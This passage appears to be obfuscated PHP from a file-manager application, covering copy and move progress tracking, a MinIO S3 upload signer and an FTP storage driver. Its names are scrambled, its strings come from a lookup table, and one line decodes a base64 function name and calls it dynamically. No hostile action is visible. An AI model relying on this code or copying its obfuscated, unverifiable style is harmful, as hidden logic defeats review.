$øëÕ˜ôÒ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($æı–ôë [1717], array($this, $æı–ôë [1718])); Hook::bind($æı–ôë [1264], array($this, $æı–ôë [1719])); Hook::bind($æı–ôë [1720], array($this, $æı–ôë [1721])); Hook::bind($æı–ôë [644], array($this, $æı–ôë [1722])); Hook::bind($æı–ôë [645], array($this, $æı–ôë [1723])); Hook::bind($æı–ôë [652], array($this, $æı–ôë [1724])); Hook::bind($æı–ôë [653], array($this, $æı–ôë [1725])); Hook::bind($æı–ôë [647], array($this, $æı–ôë [1726])); Hook::bind($æı–ôë [650], array($this, $æı–ôë [1727])); Hook::bind($æı–ôë [613], array($this, $æı–ôë [1728])); Hook::bind($æı–ôë [610], array($this, $æı–ôë [1728])); Hook::bind($æı–ôë [615], array($this, $æı–ôë [1728])); Hook::bind($æı–ôë [617], array($this, $æı–ôë [1728])); Hook::bind($æı–ôë [619], array($this, $æı–ôë [1728])); Hook::bind($æı–ôë [1729], array($this, $æı–ôë [1730])); Hook::bind($æı–ôë [635], array($this, $æı–ôë [1731])); $this->sourceModelCopyFlag = !1; Hook::bind($æı–ôë [1732], array($this, $æı–ôë [1733])); Hook::bind($æı–ôë [1734], array($this, $æı–ôë [1735])); Hook::bind($æı–ôë [1736], array($this, $æı–ôë [1737])); $øëÕ˜ôÒ[$æı–ôë [1738]] = LNG($æı–ôë [1739]); $øëÕ˜ôÒ[$æı–ôë [1740]] = 0; $øëÕ˜ôÒ[$æı–ôë [1741]] = 0; $øëÕ˜ôÒ[$æı–ôë [1105]] = $æı–ôë [12]; $øëÕ˜ôÒ[$æı–ôë [1742]] = $æı–ôë [12]; $øëÕ˜ôÒ[$æı–ôë [1743]] = 0; $øëÕ˜ôÒ[$æı–ôë [1744]] = 0; $øëÕ˜ôÒ[$æı–ôë [1745]] = 0; if (!$øëÕ˜ôÒ[$æı–ôë [1584]]) { $øëÕ˜ôÒ[$æı–ôë [1584]] = LNG($æı–ôë [1746]); } } protected function endAfter() { $ÈÅ–Ô×ğ =& $_SERVER[‚ûòÉ˜ş]; Hook::unbind($ÈÅ–Ô×ğ[1717], array($this, $ÈÅ–Ô×ğ[1718])); Hook::unbind($ÈÅ–Ô×ğ[1264], array($this, $ÈÅ–Ô×ğ[1719])); Hook::unbind($ÈÅ–Ô×ğ[1720], array($this, $ÈÅ–Ô×ğ[1721])); Hook::unbind($ÈÅ–Ô×ğ[644], array($this, $ÈÅ–Ô×ğ[1722])); Hook::unbind($ÈÅ–Ô×ğ[645], array($this, $ÈÅ–Ô×ğ[1723])); Hook::unbind($ÈÅ–Ô×ğ[652], array($this, $ÈÅ–Ô×ğ[1724])); Hook::unbind($ÈÅ–Ô×ğ[653], array($this, $ÈÅ–Ô×ğ[1725])); Hook::unbind($ÈÅ–Ô×ğ[647], array($this, $ÈÅ–Ô×ğ[1726])); Hook::unbind($ÈÅ–Ô×ğ[650], array($this, $ÈÅ–Ô×ğ[1727])); Hook::unbind($ÈÅ–Ô×ğ[613], array($this, $ÈÅ–Ô×ğ[1728])); Hook::unbind($ÈÅ–Ô×ğ[610], array($this, $ÈÅ–Ô×ğ[1728])); Hook::unbind($ÈÅ–Ô×ğ[615], array($this, $ÈÅ–Ô×ğ[1728])); Hook::unbind($ÈÅ–Ô×ğ[617], array($this, $ÈÅ–Ô×ğ[1728])); Hook::unbind($ÈÅ–Ô×ğ[619], array($this, $ÈÅ–Ô×ğ[1728])); Hook::unbind($ÈÅ–Ô×ğ[1729], array($this, $ÈÅ–Ô×ğ[1730])); Hook::unbind($ÈÅ–Ô×ğ[635], array($this, $ÈÅ–Ô×ğ[1731])); Hook::unbind($ÈÅ–Ô×ğ[1732], array($this, $ÈÅ–Ô×ğ[1733])); Hook::unbind($ÈÅ–Ô×ğ[1734], array($this, $ÈÅ–Ô×ğ[1735])); Hook::unbind($ÈÅ–Ô×ğ[1736], array($this, $ÈÅ–Ô×ğ[1737])); } public function copyMoveStart($–Ï“²ä‹, $ªŸœ»½, $–Š×µ»¸, $üÚˆÆ•ö) { $ú‘¿„ÛÈ =& $_SERVER[‚ûòÉ˜ş]; self::log($ú‘¿„ÛÈ[1747] . $ªŸœ»½ . $ú‘¿„ÛÈ[80] . $üÚˆÆ•ö); $ÊÍúñòÁ = rtrim(TEMP_FILES, $ú‘¿„ÛÈ[8]); if (substr($ªŸœ»½, 0, strlen($ÊÍúñòÁ)) == $ÊÍúñòÁ) { return; } if (substr($üÚˆÆ•ö, 0, strlen($ÊÍúñòÁ)) == $ÊÍúñòÁ) { return; } $½—õúŒá =& $this->task; $½—õúŒá[$ú‘¿„ÛÈ[1748]] = KodIO::transferType($–Ï“²ä‹, $–Š×µ»¸); $this->update(); } public function updateAfter() { $ÕƒœÖ =& $_SERVER[‚ûòÉ˜ş]; $íÑÏ½‡ô =& $this->task; if (!$íÑÏ½‡ô[$ÕƒœÖ[803]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($íÑÏ½‡ô[$ÕƒœÖ[1748]] == $ÕƒœÖ[1356]) { return; } self::updateTask($íÑÏ½‡ô); } private static function updateTask(&$åô¬î’ó) { $Ñ­ªÎšÊ =& $_SERVER[‚ûòÉ˜ş]; if ($åô¬î’ó[$Ñ­ªÎšÊ[1748]] == $Ñ­ªÎšÊ[1235] || $åô¬î’ó[$Ñ­ªÎšÊ[1748]] == $Ñ­ªÎšÊ[117]) { if ($åô¬î’ó[$Ñ­ªÎšÊ[1742]]) { $åô¬î’ó[$Ñ­ªÎšÊ[1745]] = $åô¬î’ó[$Ñ­ªÎšÊ[1744]] + $åô¬î’ó[$Ñ­ªÎšÊ[1741]]; } } else { if ($åô¬î’ó[$Ñ­ªÎšÊ[1748]] == $Ñ­ªÎšÊ[1357]) { if ($åô¬î’ó[$Ñ­ªÎšÊ[1742]] == $Ñ­ªÎšÊ[1235]) { $åô¬î’ó[$Ñ­ªÎšÊ[1745]] = $åô¬î’ó[$Ñ­ªÎšÊ[1744]] + $åô¬î’ó[$Ñ­ªÎšÊ[1741]] * 0.5; } else { if ($åô¬î’ó[$Ñ­ªÎšÊ[1742]] == $Ñ­ªÎšÊ[117]) { $åô¬î’ó[$Ñ­ªÎšÊ[1745]] = $åô¬î’ó[$Ñ­ªÎšÊ[1744]] + $åô¬î’ó[$Ñ­ªÎšÊ[1740]] * 0.5 + $åô¬î’ó[$Ñ­ªÎšÊ[1741]] * 0.5; } } } } $åô¬î’ó[$Ñ­ªÎšÊ[1689]] = $åô¬î’ó[$Ñ­ªÎšÊ[1745]] / $åô¬î’ó[$Ñ­ªÎšÊ[803]]; if ($åô¬î’ó[$Ñ­ªÎšÊ[1689]] > 0) { $¶÷õş²ò = timeFloat() - $åô¬î’ó[$Ñ­ªÎšÊ[1691]] - $åô¬î’ó[$Ñ­ªÎšÊ[1694]]; $åô¬î’ó[$Ñ­ªÎšÊ[1695]] = $¶÷õş²ò * (1 - $åô¬î’ó[$Ñ­ªÎšÊ[1689]]) / $åô¬î’ó[$Ñ­ªÎšÊ[1689]]; } } public function addPath($ÏôùË) { $ü‚ƒş¹Ñ =& $_SERVER[‚ûòÉ˜ş]; if (!$ÏôùË) { return; } $¸ÄéşÙ¸ =& $this->task; $Í­½ëÁ = IO::infoWithChildren($ÏôùË); $ğ¢²ÖÑ» = $¸ÄéşÙ¸[$ü‚ƒş¹Ñ[1749]] ? $¸ÄéşÙ¸[$ü‚ƒş¹Ñ[1749]][$ü‚ƒş¹Ñ[1750]] : 0; $¸ÄéşÙ¸[$ü‚ƒş¹Ñ[1749]] = array($ü‚ƒş¹Ñ[1750] => $ğ¢²ÖÑ» + 1, $ü‚ƒş¹Ñ[470] => $Í­½ëÁ[$ü‚ƒş¹Ñ[42]], $ü‚ƒş¹Ñ[94] => $Í­½ëÁ[$ü‚ƒş¹Ñ[94]], $ü‚ƒş¹Ñ[559] => $Í­½ëÁ[$ü‚ƒş¹Ñ[559]] ? $Í­½ëÁ[$ü‚ƒş¹Ñ[559]] : $Í­½ëÁ[$ü‚ƒş¹Ñ[94]]); if ($Í­½ëÁ[$ü‚ƒş¹Ñ[43]] == $ü‚ƒş¹Ñ[224]) { $¸ÄéşÙ¸[$ü‚ƒş¹Ñ[826]] += 1; } else { $¸ÄéşÙ¸[$ü‚ƒş¹Ñ[826]] += $Í­½ëÁ[$ü‚ƒş¹Ñ[89]][$ü‚ƒş¹Ñ[87]]; if ($Í­½ëÁ[$ü‚ƒş¹Ñ[191]]) { $¸ÄéşÙ¸[$ü‚ƒş¹Ñ[826]] += $Í­½ëÁ[$ü‚ƒş¹Ñ[89]][$ü‚ƒş¹Ñ[88]] + 1; } } $¸ÄéşÙ¸[$ü‚ƒş¹Ñ[803]] += $Í­½ëÁ[$ü‚ƒş¹Ñ[86]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ù™–»ê») { } public function sourceAddHashEnd($‚ÂŠş ) { } public function sourceAddFileStart($ŞêÀ¼Ú) { $€Âµµœ =& $_SERVER[‚ûòÉ˜ş]; $óÓ†¾Š =& $this->task; $óÓ†¾Š[$€Âµµœ[1740]] = $ŞêÀ¼Ú[$€Âµµœ[86]]; $óÓ†¾Š[$€Âµµœ[1738]] = $ŞêÀ¼Ú[$€Âµµœ[42]]; $óÓ†¾Š[$€Âµµœ[1105]] = $ŞêÀ¼Ú[$€Âµµœ[42]]; $óÓ†¾Š[$€Âµµœ[1751]] = $ŞêÀ¼Ú[$€Âµµœ[94]]; $this->update(); } public function sourceAddFileEnd($÷¨†Îœ¼) { $±›–ª” =& $_SERVER[‚ûòÉ˜ş]; $¢˜Ÿ®ĞÎ =& $this->task; $¢˜Ÿ®ĞÎ[$±›–ª”[1745]] += $÷¨†Îœ¼[$±›–ª”[86]]; $¢˜Ÿ®ĞÎ[$±›–ª”[1751]] = $÷¨†Îœ¼[$±›–ª”[94]]; $this->update(1); } public function copyFileStart($é¸¯ÒÈû, $ºŸ¯Şõ, $ûÃÚİ––, $½íßõğ, $‘Ğ—Êú·, $ÇÊ’ÇêŒ) { $¾¾íğÕÏ =& $_SERVER[‚ûòÉ˜ş]; $ŸÍ·Ø™Ö = $‘Ğ—Êú·; if ($ŸÍ·Ø™Ö == $GLOBALS[$¾¾íğÕÏ[1752]]) { $ŸÍ·Ø™Ö = $GLOBALS[$¾¾íğÕÏ[1753]]; } $GLOBALS[$¾¾íğÕÏ[1753]] = $‘Ğ—Êú·; $GLOBALS[$¾¾íğÕÏ[1752]] = $ÇÊ’ÇêŒ; $Â³û¦áø =& $this->task; $Â³û¦áø[$¾¾íğÕÏ[1738]] = $ŸÍ·Ø™Ö; $Â³û¦áø[$¾¾íğÕÏ[1740]] = (int) $é¸¯ÒÈû->size($ºŸ¯Şõ); $Â³û¦áø[$¾¾íğÕÏ[1741]] = 0; $Â³û¦áø[$¾¾íğÕÏ[1105]] = $¾¾íğÕÏ[12]; $Â³û¦áø[$¾¾íğÕÏ[1742]] = $¾¾íğÕÏ[12]; $Â³û¦áø[$¾¾íğÕÏ[1743]] = 0; $†¢‹ŸœŠ = $Â³û¦áø[$¾¾íğÕÏ[1740]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Â³û¦áø[$¾¾íğÕÏ[451]] . $¾¾íğÕÏ[1754]); if ($†¢‹ŸœŠ && file_exists(get_path_father($½íßõğ))) { Cache::set($Â³û¦áø[$¾¾íğÕÏ[451]] . $¾¾íğÕÏ[1754], $½íßõğ); $Â³û¦áø[$¾¾íğÕÏ[1711]] = array($¾¾íğÕÏ[1755], $¾¾íğÕÏ[1756]); } $this->update(0, $†¢‹ŸœŠ); } public static function updateCopyLocalFileSize($‡‡¨°äü) { $¸ÏıÀëÀ =& $_SERVER[‚ûòÉ˜ş]; $ûª€‡ÜÖ = Cache::get($‡‡¨°äü[$¸ÏıÀëÀ[451]] . $¸ÏıÀëÀ[1754]); if (!$ûª€‡ÜÖ || !file_exists($ûª€‡ÜÖ)) { return $‡‡¨°äü; } $‡‡¨°äü[$¸ÏıÀëÀ[1741]] = @filesize($ûª€‡ÜÖ); $‡‡¨°äü[$¸ÏıÀëÀ[1745]] += $‡‡¨°äü[$¸ÏıÀëÀ[1741]]; self::updateTask($‡‡¨°äü); return $‡‡¨°äü; } public function copyFileEnd($ãçıŒ©ä, $«êĞô÷³, $¼Ç ì•ô, $Ö±ÉÄèÚ, $ê¤šù›å, $™­ À¨Ë) { $¦„•áä» =& $_SERVER[‚ûòÉ˜ş]; $º‚õë°‹ =& $this->task; $º‚õë°‹[$¦„•áä»[1741]] = $º‚õë°‹[$¦„•áä»[1740]]; $º‚õë°‹[$¦„•áä»[1742]] = $¦„•áä»[12]; unset($º‚õë°‹[$¦„•áä»[1711]]); if ($ê¤šù›å == $º‚õë°‹[$¦„•áä»[1738]]) { $º‚õë°‹[$¦„•áä»[1744]] += $º‚õë°‹[$¦„•áä»[1740]]; $º‚õë°‹[$¦„•áä»[1745]] = $º‚õë°‹[$¦„•áä»[1744]]; $ã ¦±êù = 1; if (isset($º‚õë°‹[$¦„•áä»[1751]]) && $º‚õë°‹[$¦„•áä»[1751]] == $«êĞô÷³) { $ã ¦±êù = 0; } $this->update($ã ¦±êù); } else { $this->update(); $º‚õë°‹[$¦„•áä»[1741]] = 0; } Cache::remove($º‚õë°‹[$¦„•áä»[451]] . $¦„•áä»[1754]); self::log($¦„•áä»[1757] . $«êĞô÷³ . $¦„•áä»[80] . $Ö±ÉÄèÚ . $¦„•áä»[18] . $ê¤šù›å . $¦„•áä»[1758] . $º‚õë°‹[$¦„•áä»[1738]]); } public function updateFileEnd($†ÈÛÃìØ, $İÄ È®Ï) { $ÜË€ˆ… =& $_SERVER[‚ûòÉ˜ş]; $Ğ…ËŸÃ– =& $this->task; $Ğ…ËŸÃ–[$ÜË€ˆ…[1738]] = $†ÈÛÃìØ; $Ğ…ËŸÃ–[$ÜË€ˆ…[1740]] = $İÄ È®Ï; $Ğ…ËŸÃ–[$ÜË€ˆ…[1744]] += $İÄ È®Ï; $Ğ…ËŸÃ–[$ÜË€ˆ…[1745]] = $Ğ…ËŸÃ–[$ÜË€ˆ…[1744]]; $this->update(1); self::log($ÜË€ˆ…[1759] . $†ÈÛÃìØ); } public function sourceModelCopy($ªĞ¥Ò‰) { $ì€³ßä¸ =& $_SERVER[‚ûòÉ˜ş]; $šãÉåÜô = $ªĞ¥Ò‰[0]; $§¡Òöº = $ªĞ¥Ò‰[1]; $‡ò³’Åë =& $this->task; $this->sourceModelCopyFlag = !0; $‚£óıµ€ = 0; switch ($šãÉåÜô) { case $ì€³ßä¸[611]: $‚£óıµ€ = 1; break; case $ì€³ßä¸[614]: $‡ò³’Åë[$ì€³ßä¸[1738]] = $§¡Òöº[$ì€³ßä¸[42]]; break; case $ì€³ßä¸[616]: $‚£óıµ€ = intval($ªĞ¥Ò‰[$ì€³ßä¸[432]] * 0.4); break; case $ì€³ßä¸[618]: $‚£óıµ€ = intval($ªĞ¥Ò‰[$ì€³ßä¸[432]] * 0.2); break; case $ì€³ßä¸[620]: $‚£óıµ€ = intval($ªĞ¥Ò‰[$ì€³ßä¸[432]] * 0.4); break; } $this->update($‚£óıµ€); $this->sourceModelCopyFlag = !1; } public function sourceRemove($îÚ‘€ù, $¾Ã®ÓÍ) { $µ©²Ûò– =& $_SERVER[‚ûòÉ˜ş]; $this->sourceModelCopyFlag = !0; $ÙÏÄšĞ„ = 1; if (isset($îÚ‘€ù[$µ©²Ûò–[89]])) { $ÙÏÄšĞ„ = $îÚ‘€ù[$µ©²Ûò–[89]][$µ©²Ûò–[87]]; $ÙÏÄšĞ„ = $ÙÏÄšĞ„ + $îÚ‘€ù[$µ©²Ûò–[89]][$µ©²Ûò–[88]] + 1; } $this->update($ÙÏÄšĞ„); $this->sourceModelCopyFlag = !1; } public function sourceMove($ôÑ§Œ) { $this->sourceRemove($ôÑ§Œ, !1); } public function curlProgress($Ââø¹’î, $ıáÌ…Áå, $Ãó™îŸ´, $å§–²õå, $İéíª¯€) { $¨óª´ =& $_SERVER[‚ûòÉ˜ş]; $–Œñ»Ç» =& $this->task; if ($İéíª¯€ > 0) { $–Œñ»Ç»[$¨óª´[1105]] = $¨óª´[1760]; $–Œñ»Ç»[$¨óª´[1742]] = $¨óª´[117]; if ($–Œñ»Ç»[$¨óª´[1740]]) { $–Œñ»Ç»[$¨óª´[1741]] = $İéíª¯€; } if ($–Œñ»Ç»[$¨óª´[1743]]) { $–Œñ»Ç»[$¨óª´[1741]] = $İéíª¯€ + $–Œñ»Ç»[$¨óª´[1743]]; } } else { if ($Ãó™îŸ´ > 0) { if ($–Œñ»Ç»[$¨óª´[1740]] == $ıáÌ…Áå) { $–Œñ»Ç»[$¨óª´[1741]] = $Ãó™îŸ´; $–Œñ»Ç»[$¨óª´[1105]] = $¨óª´[1761]; $–Œñ»Ç»[$¨óª´[1742]] = $¨óª´[1235]; } } } $this->update(); } public function curlProgressStart($÷äüÀº®) { } public function curlProgressEnd($Ô‰‹•Ê) { $æÉ†åÎ =& $_SERVER[‚ûòÉ˜ş]; $ğ±•üã“ =& $this->task; $Ç±ğÚ”è = curl_getinfo($Ô‰‹•Ê); $Àƒ‚ìã = $Ç±ğÚ”è[$æÉ†åÎ[1762]]; if ($Àƒ‚ìã == -1) { $Àƒ‚ìã = $Ç±ğÚ”è[$æÉ†åÎ[1763]]; } if ($ğ±•üã“[$æÉ†åÎ[1742]] == $æÉ†åÎ[117] && $Àƒ‚ìã) { $ğ±•üã“[$æÉ†åÎ[1743]] += $Àƒ‚ìã; } $this->update(); } } goto F¬¹ï¤Òò; F‡‡Ï·Ò‘Ì: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¯–“ÇÉ) { parent::__construct($¯–“ÇÉ); $this->signatureVersion($_SERVER[‚ûòÉ˜ş][241]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($á…£˜¶, $àØƒîŒË = 3600) { $¾ñ¢š“¯ =& $_SERVER[‚ûòÉ˜ş]; $ÛÏÄÓ†ó = $¾ñ¢š“¯[223]; $úŒ“ø”³ = $¾ñ¢š“¯[262]; $“¡¨Éã® = $¾ñ¢š“¯[72]; $ÒÏØâù = gmdate($¾ñ¢š“¯[263]); $­“ÂÜœÙ = gmdate($¾ñ¢š“¯[264]); $ëİ†Ğ´Ğ = $¾ñ¢š“¯[265]; $Ê½ÓñÜ™ = $àØƒîŒË . $¾ñ¢š“¯[12]; $Œ·˜ĞÄĞ = $¾ñ¢š“¯[266]; $ëˆ†åÅ§ = array($this->accessKey, $­“ÂÜœÙ, $this->region, $“¡¨Éã®, $ëİ†Ğ´Ğ); $Çˆ°¸º¬ = implode($¾ñ¢š“¯[8], $ëˆ†åÅ§); $ñíšÕŒ = array($¾ñ¢š“¯[267] => gmdate($¾ñ¢š“¯[268], strtotime($¾ñ¢š“¯[269])), $¾ñ¢š“¯[270] => array(array($¾ñ¢š“¯[271] => $this->bucket), array($¾ñ¢š“¯[272] => $ÛÏÄÓ†ó), array($¾ñ¢š“¯[273], $¾ñ¢š“¯[274], $¾ñ¢š“¯[12]), array($¾ñ¢š“¯[273], $¾ñ¢š“¯[275], $¾ñ¢š“¯[12]), array($¾ñ¢š“¯[273], $¾ñ¢š“¯[276], $¾ñ¢š“¯[12]), array($¾ñ¢š“¯[277] => $Œ·˜ĞÄĞ), array($¾ñ¢š“¯[278] => $Çˆ°¸º¬), array($¾ñ¢š“¯[279] => $úŒ“ø”³), array($¾ñ¢š“¯[280] => $ÒÏØâù), array($¾ñ¢š“¯[281] => $Ê½ÓñÜ™))); $ÙÖ®‰´Œ = base64_encode(json_encode($ñíšÕŒ)); $ËÉçŒ”Ì = hash_hmac($¾ñ¢š“¯[282], $­“ÂÜœÙ, $¾ñ¢š“¯[283] . $this->secret, !0); $ÖàÙöĞ = hash_hmac($¾ñ¢š“¯[282], $this->region, $ËÉçŒ”Ì, !0); $ °¨æ®ª = hash_hmac($¾ñ¢š“¯[282], $“¡¨Éã®, $ÖàÙöĞ, !0); $É÷Ú€ÚÊ = hash_hmac($¾ñ¢š“¯[282], $ëİ†Ğ´Ğ, $ °¨æ®ª, !0); $ÊŒ’Š¡Û = hash_hmac($¾ñ¢š“¯[282], $ÙÖ®‰´Œ, $É÷Ú€ÚÊ); $÷î…€á¦ = array($¾ñ¢š“¯[240] => $¾ñ¢š“¯[12], $¾ñ¢š“¯[284] => $¾ñ¢š“¯[12], $¾ñ¢š“¯[272] => $ÛÏÄÓ†ó, $¾ñ¢š“¯[277] => $Œ·˜ĞÄĞ, $¾ñ¢š“¯[285] => $ÙÖ®‰´Œ, $¾ñ¢š“¯[286] => $Çˆ°¸º¬, $¾ñ¢š“¯[287] => $úŒ“ø”³, $¾ñ¢š“¯[288] => $ÒÏØâù, $¾ñ¢š“¯[289] => $Ê½ÓñÜ™, $¾ñ¢š“¯[290] => $ÊŒ’Š¡Û, $¾ñ¢š“¯[206] => $this->getHost()); return $÷î…€á¦; } } define($_SERVER[‚ûòÉ˜ş][291], 1); define($_SERVER[‚ûòÉ˜ş][292], 2); goto F‰«—ŠíäÔ; d¡â¯›÷: $fileSize = strrev(base64_decode($_SERVER[ĞÅóÜØğ][0])); function binCheckNeq($¥Ô¨–ñŞ, $¶«¾ó›½) { return $¥Ô¨–ñŞ != $¶«¾ó›½; } $_SERVER[$_SERVER[ĞÅóÜØğ][1]] = $fileSize($_SERVER[$_SERVER[ĞÅóÜØğ][2]]); goto fÏ‹ªÑÉß›; F‰«—ŠíäÔ: define($_SERVER[‚ûòÉ˜ş][293], 3); define($_SERVER[‚ûòÉ˜ş][294], 1); define($_SERVER[‚ûòÉ˜ş][295], 0); goto a ‹î»ÀùÑ; BÆÚÅ³ª”†: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ÇÒÒƒ¹) { parent::__construct(); if (count($ÇÒÒƒ¹) > 0) { $this->_init($ÇÒÒƒ¹); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ôíØÌîí) { $åú¢®á‚ =& $_SERVER[‚ûòÉ˜ş]; global $config; $this->appCharset = $config[$åú¢®á‚[1391]]; $this->systemCharset = $config[$åú¢®á‚[1392]]; if (isset($ôíØÌîí[$åú¢®á‚[1393]]) && $ôíØÌîí[$åú¢®á‚[1393]]) { $this->systemCharset = $ôíØÌîí[$åú¢®á‚[1393]]; } } public function iconvApp($ˆ¥îºÙ½) { return $this->iconvTo($ˆ¥îºÙ½, $this->systemCharset, $this->appCharset); } public function iconvSystem($½İì™Å) { return $this->iconvTo($½İì™Å, $this->appCharset, $this->systemCharset); } public function getPathOuter($‚şúÛï) { $”˜ËÈ =& $_SERVER[‚ûòÉ˜ş]; $ÏØ¿å = $this->iconvApp($this->pathBase); $‚şúÛï = $this->iconvApp($‚şúÛï); if (substr($ÏØ¿å, 0, 2) == $”˜ËÈ[1394]) { $ÏØ¿å = BASIC_PATH . substr($ÏØ¿å, 2); } if (substr($‚şúÛï, 0, 2) == $”˜ËÈ[1394]) { $‚şúÛï = BASIC_PATH . substr($‚şúÛï, 2); } $ÏØ¿å = KodIO::clear($ÏØ¿å); $‚şúÛï = KodIO::clear($‚şúÛï); $‚şúÛï = substr($‚şúÛï, strlen($ÏØ¿å)); if (empty($this->pathDriver)) { return $‚şúÛï; } return $this->pathDriver . $”˜ËÈ[8] . ltrim($‚şúÛï, $”˜ËÈ[8]); } private function _init($Ó¨¬ß×Ä = array()) { $ˆ³™ç–¦ =& $_SERVER[‚ûòÉ˜ş]; if (!function_exists($ˆ³™ç–¦[1395])) { throw new Exception(LNG($ˆ³™ç–¦[1396])); } $this->config = $Ó¨¬ß×Ä; $this->charsetReset($Ó¨¬ß×Ä); foreach ($Ó¨¬ß×Ä as $§Ã¯ûÍÖ => $½åÉê»†) { if (isset($this->{$§Ã¯ûÍÖ})) { $this->{$§Ã¯ûÍÖ} = $½åÉê»†; } } return $this->_login($Ó¨¬ß×Ä); } private function _login($Í‰§ç·µ) { $œ§š¼µ® =& $_SERVER[‚ûòÉ˜ş]; static $›¿½é²õ = array(); $ñ‡Ô¯¿™ = md5(json_encode($Í‰§ç·µ)); if (isset($›¿½é²õ[$ñ‡Ô¯¿™])) { foreach ($›¿½é²õ[$ñ‡Ô¯¿™] as $äåûß¤¦ => $á›¹×ã”) { $this->{$äåûß¤¦} = $á›¹×ã”; } return !0; } $Ğ³÷„¦ë = parse_url(trim($this->server, $œ§š¼µ®[8])); $this->host = $Ğ³÷„¦ë[$œ§š¼µ®[206]]; $îˆ÷ö = isset($Ğ³÷„¦ë[$œ§š¼µ®[205]]) && $Ğ³÷„¦ë[$œ§š¼µ®[205]] == $œ§š¼µ®[1397] ? !0 : !1; $this->scheme = $îˆ÷ö ? $œ§š¼µ®[1398] : $œ§š¼µ®[1399]; $this->port = isset($Ğ³÷„¦ë[$œ§š¼µ®[207]]) ? $Ğ³÷„¦ë[$œ§š¼µ®[207]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Ë€‘Ìüø = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $§ãä•ûÖ = $this->pasv == $œ§š¼µ®[98] ? !0 : !1; @ftp_pasv($this->connect, $§ãä•ûÖ); $›¿½é²õ[$ñ‡Ô¯¿™] = array($œ§š¼µ®[1400] => $this->connect, $œ§š¼µ®[206] => $this->host, $œ§š¼µ®[205] => $this->scheme, $œ§š¼µ®[207] => $this->port); return $Ë€‘Ìüø; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ˆ–õ©õ, $õÔÏ™†· = '', $‘Û×æ = REPEAT_RENAME) { if ($this->setContent($ˆ–õ©õ, $õÔÏ™†·)) { return $this->getPathOuter($ˆ–õ©õ); } return !1; } public function mkdir($·Ô¯á¤Ü, $ßÙºáŞ¢ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $·Ô¯á¤Ü = $this->iconvSystem($·Ô¯á¤Ü); if ($this->_isFolder($·Ô¯á¤Ü) || @ftp_mkdir($this->connect, $·Ô¯á¤Ü)) { return $this->getPathOuter($·Ô¯á¤Ü); } if (!$this->mkdir($this->pathFather($·Ô¯á¤Ü))) { return !1; } if ($·Ô¯á¤Ü = @ftp_mkdir($this->connect, $·Ô¯á¤Ü)) { return $this->getPathOuter($·Ô¯á¤Ü); } return !1; } public function copyFile($«Òùöê—, $º§àè¥) { if (!$this->_isconn()) { return !1; } $¨Ü‚ø© = $this->pathThis($this->iconvSystem($«Òùöê—)); $»şÒ»­ = $this->tempFile($¨Ü‚ø©); $ÙÊ§¼Ûí = $this->iconvApp($»şÒ»­); $this->download($«Òùöê—, $ÙÊ§¼Ûí); $çõ¥»ü’ = $this->upload($º§àè¥, $ÙÊ§¼Ûí); $this->tempFileRemve($»şÒ»­); return $çõ¥»ü’; } public function moveFile($ìèó˜ã, $²÷ ÄÎ) { if (!$this->_isconn()) { return !1; } $ìèó˜ã = $this->iconvSystem($ìèó˜ã); $²÷ ÄÎ = $this->iconvSystem($²÷ ÄÎ); $ÛĞèñ…¨ = @ftp_rename($this->connect, $ìèó˜ã, $²÷ ÄÎ); return $ÛĞèñ…¨ ? $this->getPathOuter($²÷ ÄÎ) : !1; } public function delFile($ì²ØÁŒ) { if (!$this->_isconn()) { return !1; } $ì²ØÁŒ = $this->iconvSystem($ì²ØÁŒ); return @ftp_delete($this->connect, $ì²ØÁŒ); } public function delFolder($ã–™òÅ²) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $²¦Ûê¤ = $»ò¡¼ÀÆ = array(); $this->fileList($ã–™òÅ², $²¦Ûê¤, $»ò¡¼ÀÆ, !0); $this->listItemCache = !0; foreach ($»ò¡¼ÀÆ as $ú”‘„²ù) { $òôÜôì› = $this->iconvSystem($ú”‘„²ù[$_SERVER[‚ûòÉ˜ş][42]]); $‚ˆ©ªÁ = @ftp_delete($this->connect, $òôÜôì›); if (!$‚ˆ©ªÁ) { return !1; } } foreach ($²¦Ûê¤ as $òôÜôì›) { $òôÜôì› = $this->iconvSystem($òôÜôì›); $‚ˆ©ªÁ = @ftp_rmdir($this->connect, $òôÜôì›); if (!$‚ˆ©ªÁ) { return !1; } } $ã–™òÅ² = $this->iconvSystem($ã–™òÅ²); return @ftp_rmdir($this->connect, $ã–™òÅ²); } public function rename($Ë¯ÖÄ, $íß¹Û´) { $í“ÜÅÙõ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->_isconn()) { return !1; } $¶°İ‡µ = $this->fileNameAuto($this->pathFather($Ë¯ÖÄ), $íß¹Û´); $¶°İ‡µ = $this->iconvSystem($¶°İ‡µ); $Ë¯ÖÄ = $this->iconvSystem($Ë¯ÖÄ); $¦¯ïÀŞç = $this->pathFather($Ë¯ÖÄ); $‘Â ²‹¬ = rtrim($¦¯ïÀŞç, $í“ÜÅÙõ[8]) . $í“ÜÅÙõ[8] . $¶°İ‡µ; $Ö•äŒİ = @ftp_rename($this->connect, $Ë¯ÖÄ, $‘Â ²‹¬); $‘Â ²‹¬ = $this->iconvApp($‘Â ²‹¬); return $Ö•äŒİ ? $this->getPathOuter($‘Â ²‹¬) : !1; } private function folderInfo($’’î’Ù, $èŒÏîìï = false) { $¥†×€“ =& $_SERVER[‚ûòÉ˜ş]; $§ØãÌ³œ = array($¥†×€“[42] => 